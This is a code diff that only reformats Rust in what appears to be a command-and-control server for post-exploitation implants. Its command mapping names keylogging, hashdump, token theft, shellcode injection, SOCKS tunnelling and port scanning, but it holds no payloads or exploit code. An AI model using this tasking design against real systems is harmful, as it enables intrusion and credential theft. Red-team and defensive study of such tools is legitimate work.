@@ -1651,7 +1651,16 @@ fn handle_new_session_register(
     );
     let boot_time = now_unix();
     let session = handle_new_session_build_session(raw, key, info, fp);
-    handle_new_session_insert(st, raw, session, new_event, persist_id, persist_info, boot_time, reply_key)
+    handle_new_session_insert(
+        st,
+        raw,
+        session,
+        new_event,
+        persist_id,
+        persist_info,
+        boot_time,
+        reply_key,
+    )
 }
 
 /// Build the `SessionNew` scripting event and pop the inbound TLS fingerprint
@@ -2257,8 +2266,7 @@ fn authenticate_legacy_token(expected: &str, bearer_val: Option<&str>) -> AuthOu
     // `subtle::ct_eq` short-circuits on length mismatch, which would
     // leak `want.len()` as a timing oracle. Reject mismatched lengths
     // up front so the comparison only ever runs on equal-length slices.
-    if presented.len() != want.len() || !constant_time_eq(want.as_bytes(), presented.as_bytes())
-    {
+    if presented.len() != want.len() || !constant_time_eq(want.as_bytes(), presented.as_bytes()) {
         return AuthOutcome::Denied(StatusCode::UNAUTHORIZED.into_response());
     }
     AuthOutcome::Allowed(operators::OperatorIdentity {
@@ -2449,13 +2457,33 @@ impl JsonCommand {
         Ok(match self {
             JsonCommand::Ping => Command::Ping,
             JsonCommand::Shell { args } => Command::Shell { args },
-            JsonCommand::Sleep { seconds, jitter_pct } => Command::Sleep { seconds, jitter_pct },
+            JsonCommand::Sleep {
+                seconds,
+                jitter_pct,
+            } => Command::Sleep {
+                seconds,
+                jitter_pct,
+            },
             JsonCommand::Upload { name, data_hex } => into_command_upload(name, data_hex)?,
             JsonCommand::Download { path } => Command::Download { path },
-            JsonCommand::Bof { name, args, data_hex } => into_command_bof(name, args, data_hex)?,
+            JsonCommand::Bof {
+                name,
+                args,
+                data_hex,
+            } => into_command_bof(name, args, data_hex)?,
             JsonCommand::FileOp { op, path, dest } => into_command_fileop(op, path, dest)?,
             JsonCommand::Connect { host, port } => into_command_connect(host, port),
-            JsonCommand::Socks { chan, op, addr, port } => Command::Socks { chan, op, addr, port },
+            JsonCommand::Socks {
+                chan,
+                op,
+                addr,
+                port,
+            } => Command::Socks {
+                chan,
+                op,
+                addr,
+                port,
+            },
             JsonCommand::Screenshot { monitor } => Command::Screenshot { monitor },
             JsonCommand::Portscan { host, ports } => Command::Portscan { host, ports },
             JsonCommand::Net { query } => Command::Net { query },
@@ -2465,7 +2493,9 @@ impl JsonCommand {
             JsonCommand::Keylog { action } => Command::Keylog { action },
             JsonCommand::Screenwatch { interval_secs } => Command::Screenwatch { interval_secs },
             JsonCommand::Hashdump { method } => Command::Hashdump { method },
-            JsonCommand::ChannelData { chan, data_hex } => into_command_channel_data(chan, data_hex)?,
+            JsonCommand::ChannelData { chan, data_hex } => {
+                into_command_channel_data(chan, data_hex)?
+            }
             JsonCommand::ChannelClose { chan } => Command::ChannelClose { chan },
             JsonCommand::StealToken { pid } => Command::StealToken { pid },
             JsonCommand::MakeToken {
@@ -2481,9 +2511,12 @@ impl JsonCommand {
             },
             JsonCommand::Rev2Self => Command::Rev2Self,
             JsonCommand::GetUid => Command::GetUid,
-            JsonCommand::Inject { method, pid, spawn_to, sc_hex } => {
-                into_command_inject(method, pid, spawn_to, sc_hex)?
-            }
+            JsonCommand::Inject {
+                method,
+                pid,
+                spawn_to,
+                sc_hex,
+            } => into_command_inject(method, pid, spawn_to, sc_hex)?,
             JsonCommand::Trex => Command::Trex,
             JsonCommand::SetChannel { channel } => Command::SetChannel { channel },
             JsonCommand::Exit => Command::Exit,
